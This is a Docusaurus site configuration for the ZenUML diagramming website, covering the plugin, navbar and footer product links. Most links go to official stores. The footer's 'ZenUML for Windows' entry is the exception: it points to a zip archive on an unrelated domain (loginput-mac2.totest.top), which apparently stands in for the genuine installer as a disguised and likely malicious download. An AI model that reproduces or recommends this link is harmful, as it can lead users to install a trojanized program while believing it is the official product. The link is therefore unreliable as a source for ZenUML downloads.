import { themes as prismThemes } from 'prism-react-renderer';
import type { Config } from '@docusaurus/types';
import type * as Preset from '@docusaurus/preset-classic';

const config: Config = {
  title: 'ZenUML',
  tagline: 'Create diagrams faster and better',
  favicon: 'favicon.ico',

  // Set the production url of your site here
  url: 'https://zenuml.com',
  // Set the /<baseUrl>/ pathname under which your site is served
  // For GitHub pages deployment, it is often '/<projectName>/'
  baseUrl: '/',

  // GitHub pages deployment config.
  // If you aren't using GitHub pages, you don't need these.
  organizationName: 'ZenUML', // Usually your GitHub org/user name.
  projectName: 'ZenUML', // Usually your repo name.

  onBrokenLinks: 'throw',
  onBrokenMarkdownLinks: 'warn',

  // Even if you don't use internationalization, you can use this field to set
  // useful metadata like html lang. For example, if your site is Chinese, you
  // may want to replace "en" with "zh-Hans".
  i18n: {
    defaultLocale: 'en',
    locales: ['en'],
  },
  plugins: [
    async function myPlugin() {
      return {
        name: 'docusaurus-tailwindcss',
        injectHtmlTags() {
          return {
            headTags: [
              {
                tagName: 'link',
                attributes: {
                  rel: 'stylesheet',
                  href: 'https://cdn.jsdelivr.net/npm/tailwindcss/dist/preflight.min.css',
                },
              },
            ],
          };
        },
        configurePostCss(postcssOptions) {
          // Appends TailwindCSS and AutoPrefixer.
          postcssOptions.plugins.push(require('tailwindcss'));
          postcssOptions.plugins.push(require('autoprefixer'));
          return postcssOptions;
        },
      };
    },
  ],
  presets: [
    [
      'classic',
      {
        docs: false,
        blog: false,
        // docs: {
        //   sidebarPath: './sidebars.ts',
        //   // Please change this to your repo.
        //   // Remove this to remove the "edit this page" links.
        //   editUrl:
        //     'https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/',
        // },
        // blog: {
        //   showReadingTime: true,
        //   // Please change this to your repo.
        //   // Remove this to remove the "edit this page" links.
        //   editUrl:
        //     'https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/',
        // },
        theme: {
          customCss: './src/css/custom.css',
        },
      } satisfies Preset.Options,
    ],
  ],

  themeConfig: {
    // Replace with your project's social card
    image: 'img/og-image.png',
    navbar: {
      title: 'ZenUML',
      logo: {
        alt: 'ZenUML Logo',
        src: '/img/logo-90x72.png',
      },
      items: [
        // {
        //   type: 'docSidebar',
        //   sidebarId: 'tutorialSidebar',
        //   position: 'left',
        //   label: 'Tutorial',
        // },
        // { to: '/blog', label: 'Blog', position: 'left' },
        {
          href: 'https://github.com/ZenUml',
          label: 'GitHub',
          position: 'right',
        },
      ],
    },
    footer: {
      style: 'dark',
      links: [
        {
          title: 'Docs',
          items: [
            {
              label: 'Tutorial',
              href: 'https://zenuml.atlassian.net/wiki/spaces/Doc/overview',
            },
          ],
        },
        {
          title: 'Products',
          items: [
            {
              label: 'Diagrams for Confluence',
              href: 'https://marketplace.atlassian.com/apps/1218380/zenuml-diagrams-for-confluence-freemium?hosting=cloud&tab=overview&src=landing',
            },
            {
              label: 'Online Editor',
              href: 'https://app.zenuml.com/',
            },
            {
              label: 'Chrome Extendsion',
              href: 'https://chrome.google.com/webstore/detail/web-sequence/kcpganeflmhffnlofpdmcjklmdpbbmef',
            },
            {
              label: 'JetBrains Plugin',
              href: 'https://plugins.jetbrains.com/plugin/12437-zenuml-support',
            },
            {
              label: 'Visual Studio Code Plugin',
              href: 'https://marketplace.visualstudio.com/items?itemName=mrcoder.zenuml',
            },
            {
              label: 'ZenUML for Mac',
              href: 'https://apps.apple.com/app/zenuml/id1602636196?mt=12',
            },
            {
              label: 'ZenUML for Windows',
              href: 'https://loginput-mac2.totest.top/ZenUML-Setup.zip',
            },
          ],
        },
        {
          title: 'Community',
          items: [
            {
              label: 'Facebook',
              href: 'https://www.facebook.com/zenuml?src=landing',
            },
            {
              label: 'Twitter',
              href: 'https://twitter.com/zenuml',
            },
            {
              label: 'YouTube',
              href: 'https://www.youtube.com/results?search_query=zenuml',
            },
          ],
        },
        {
          title: 'More',
          items: [
            // {
            //   label: 'Blog',
            //   to: '/blog',
            // },
            {
              label: 'GitHub',
              href: 'https://github.com/facebook/docusaurus',
            },
            {
              label: 'EULA',
              href: 'https://app.zenuml.com/End-User-License-Agreement/index.html',
            },
            {
              label: 'Privacy Policy',
              href: 'https://app.zenuml.com/privacy-policy/privacy-policy.html',
            },
          ],
        },
      ],
      copyright: `©Copyright 2017 – 2023 P&D Vision Pty Ltd. | support@zenuml.com`,
    },
    prism: {
      theme: prismThemes.github,
      darkTheme: prismThemes.dracula,
    },
  } satisfies Preset.ThemeConfig,
};

export default config;
